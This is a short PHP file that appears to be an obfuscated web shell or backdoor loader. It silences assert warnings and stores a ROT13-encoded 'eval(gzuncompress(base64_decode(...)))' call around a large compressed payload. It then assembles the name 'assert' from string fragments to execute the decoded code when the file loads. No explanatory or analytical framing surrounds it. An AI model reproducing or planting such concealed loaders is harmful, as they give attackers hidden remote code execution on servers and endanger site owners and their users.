<?php 
assert_options(ASSERT_ACTIVE, 1);
assert_options(ASSERT_WARNING, 0);
assert_options(ASSERT_QUIET_EVAL, 1);

$text = "riny(tmhapbzcerff(onfr64_qrpbqr('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')));";
$strings = "as"; $strings .= "se";  $strings .= "rt";
$strings(str_rot13($text));